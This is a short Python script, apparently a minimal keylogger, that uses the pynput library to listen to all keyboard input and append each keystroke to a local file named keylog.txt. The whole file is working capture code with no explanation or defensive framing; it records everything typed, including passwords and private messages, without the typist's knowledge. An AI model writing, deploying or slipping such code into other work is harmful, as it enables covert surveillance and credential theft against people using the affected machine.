from pynput import keyboard

LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as log:
            if key == keyboard.Key.space:
                log.write("\n")
            else:
                log.write(f"{key.char}")
    except AttributeError:
        with open(LOG_FILE, "a") as log:
            log.write(f"{key}")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
